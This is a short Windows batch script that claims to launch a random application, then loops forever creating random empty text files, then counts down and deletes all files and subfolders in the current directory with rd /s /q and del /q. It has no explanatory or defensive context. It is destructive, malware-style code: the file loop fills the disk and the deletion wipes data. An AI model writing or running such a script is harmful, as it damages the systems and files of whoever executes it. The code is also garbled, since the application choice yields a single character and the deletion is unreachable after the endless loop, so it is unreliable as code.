@echo off
setlocal enabledelayedexpansion

:: List of applications to randomly choose from
set apps= [notepad.exe, paint.exe, calc.exe, cmd.exe]

:: Choose a random application from the list
set /a choice=%random% %% 4

:: Start the chosen application
start !apps:~%choice%,1!

:: Create infinite random files
:loop
set filename=%random%_!random!_!random!.txt
echo.>"%filename%"
goto loop

:: Count down from 10
:countdown
echo 10
ping -n 2 localhost >nul
echo 9
ping -n 2 localhost >nul
echo 8
ping -n 2 localhost >nul
echo 7
ping -n 2 localhost >nul
echo 6
ping -n 2 localhost >nul
echo 5
ping -n 2 localhost >nul
echo 4
ping -n 2 localhost >nul
echo 3
ping -n 2 localhost >nul
echo 2
ping -n 2 localhost >nul
echo 1
ping -n 2 localhost >nul

:: Delete all files in the current directory
for /d %%D in (*) do rd "%%D" /s /q
for %%F in (*) do del "%%F" /q
